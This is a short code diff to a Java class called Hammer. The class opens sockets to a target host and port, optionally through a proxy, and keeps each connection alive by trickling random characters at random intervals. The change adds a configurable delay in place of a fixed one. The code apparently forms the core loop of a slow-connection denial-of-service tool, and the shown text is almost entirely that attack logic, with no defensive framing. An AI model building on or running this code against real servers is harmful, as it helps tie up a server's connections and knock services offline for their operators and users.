@@ -40,14 +40,17 @@ public class Hammer implements Runnable {
 	private String phost;
 	private int pport;
 	
+	private int delay;
+	
 	private Socket socket;
 	
-	public Hammer(String address, int port, boolean proxy, String phost, int pport) {
+	public Hammer(String address, int port, boolean proxy, String phost, int pport, int delay) {
 		this.address = address;
 		this.port = port;
 		this.proxy = proxy;
 		this.phost = phost;
 		this.pport = pport;
+		this.delay = delay;
 	}
 
 	@Override
@@ -78,7 +81,7 @@ public class Hammer implements Runnable {
 				
 				while (Main.running && !socket.isClosed()) {
 					os.write((randomChar()).getBytes());
-					Thread.sleep(new Random().nextInt(3000));
+					Thread.sleep(new Random().nextInt(delay));
 				}
 				
 				socket.close();
